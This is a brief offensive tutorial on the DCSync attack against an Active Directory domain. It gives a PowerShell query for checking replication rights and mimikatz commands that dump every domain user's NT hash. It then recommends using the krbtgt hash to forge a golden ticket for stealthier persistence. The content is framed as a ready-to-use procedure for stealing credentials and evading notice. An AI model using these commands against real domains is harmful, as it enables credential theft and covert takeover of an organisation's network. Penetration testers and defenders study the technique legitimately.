# Using DCSync attack to steal user hashes in a domain

- Domain: based.local

To perform the **DCSync** attack, you have to have the following permissions over the domain

The initial foothold must be against a domain account with domain replication privileges; the **Directory Replication Service Remote Protocol** (MS-DRSR); **MS-DRSR** is a legitimate Active **Directory service** that `cannot` be disabled.

![Untitled.png](Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/Untitled.png)

# Checking permissions

By default these privileges are limited to the: `domain administrators`, `enterprise administrators`, `administrators`, and `domain controller` groups. However, in certain cases, ordinary domain owners may have the needed permissions to **launch a DCSync attack**. Those roles have replication permissions that include the following rights that enable a DCSync attack: **Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes In Filtered Set (optional)**

Some apps really need these permissions to replicate users in a domain, reason you might see groups or users with these permissions.

`Replicating Directory Changes In Filtered Set is an optional Permission`

You can check this using PowerShell

## Powershell

![Untitled%201.png](Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/Untitled%201.png)

```jsx
(Get-Acl "ad:\dc=based,dc=local").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }
```

## Command breakdown

1. `(Get-Acl "ad:\dc=based,dc=local").Access` - Grab every permission over the [based.local](http://based.local) domain objects
2. `(Get-Acl "ad:\dc=based,dc=local").Access | ? {$_.IdentityReference -match 'thereplicator'}`  - Grab every permission **thereplicator** user has over the domain objects
3. `(Get-Acl "ad:\dc=based,dc=local").Access | ? {$_.IdentityReference -match 'thereplicator' -and ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.ObjectType -eq "89e95b76-444d-4c62-991a-0facbeda640c" ) }` - We've added more checks to previous command to only grab the required permissions for our attack, which are: **Replicating Directory Changes In Filtered Se**t, **Replicating Directory Changes All**, **Replicating Directory Changes** **(optional)**

# Performing the attack itself

We are going to use mimikatz

```jsx
lsadump::dcsync /all /csv
```

This will dump the entire domain in csv format which will output username, RID and NT hash

![Untitled%202.png](Using%20DCSync%20attack%20to%20steal%20user%20hashes%20in%20a%20domain/Untitled%202.png)

You could also specify the domain like

```jsx
lsadump::dcsync /all /csv /domain:based.local
```

# What to do futher?

Well, you could use the Administrator NT Hash but that would not be very stealthy, instead you could use krbtgt's NT Hash to create a golden ticket which is much more stealthier.

# How does the attack work?

The DCSync command in Mimikatz allows an attacker to pretend to be a domain controller and retrieve password hashes from other domain controllers, without executing any code on the target. It does so over the MS-DRSR protocol via the DSGetNCChanges method that replicates updates from a naming context (NC) replica on the server.